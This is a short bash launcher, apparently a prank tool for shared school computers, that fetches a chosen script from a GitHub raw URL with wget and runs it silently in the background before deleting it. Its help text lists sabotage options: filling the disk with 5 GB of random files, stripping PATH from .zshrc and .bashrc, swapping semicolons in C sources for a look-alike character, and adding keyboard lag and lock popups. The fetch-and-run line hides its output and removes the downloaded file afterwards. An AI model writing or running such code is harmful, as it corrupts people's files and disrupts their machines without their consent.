#!/bin/bash

scriptlocation=""
argument=""

githubloc="https://raw.githubusercontent.com/Poul0s/42-troll/master"

case "$1" in
	--help)
		printf "Arguments :

		--help : show help

		-F | --full-disk : add 5G of random files everywhere

		-P | --where-are-commands : remove PATH from .zshrc and .bashrc

		-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )

		-SK | --replace-key-semicolon

		-E | --emoji-font : set emoji font

		-KW | --keyboard-wtf : add a random delay to keyboard each 50 secs

		-L | --ask-lock : add ask lock popup each 30 secs"
	;;
	--full-disk|-F)
		scriptlocation="$githubloc/full_disk.sh"
	;;
	--where-are-commands|-P)
		scriptlocation="$githubloc/where_are_commands.sh"
	;;
	--replace-semicolon|-S)
		scriptlocation="$githubloc/fake-semicolon.sh"
		argument=$2
	;;
	--replace-key-semicolon|-SK)
		scriptlocation="$githubloc/replace-key-semicolon.sh"
	;;
	--emoji-font|-E)
		scriptlocation="$githubloc/emoji_font.sh"
	;;
	--keyboard-wtf|-KW)
		scriptlocation="$githubloc/keyboard-wtf.sh"
	;;
	--ask-lock|-L)
		scriptlocation="$githubloc/asklock.sh"
	;;
	*)
		echo "arg '$1' invalid, show help with --help"
	;;
esac

if [ ! -z $scriptlocation ] ; then
	wget -q $scriptlocation -O script.sh
	nohup bash ./script.sh $argument > /dev/null 2> /dev/null && rm -rf ./script.sh &
fi
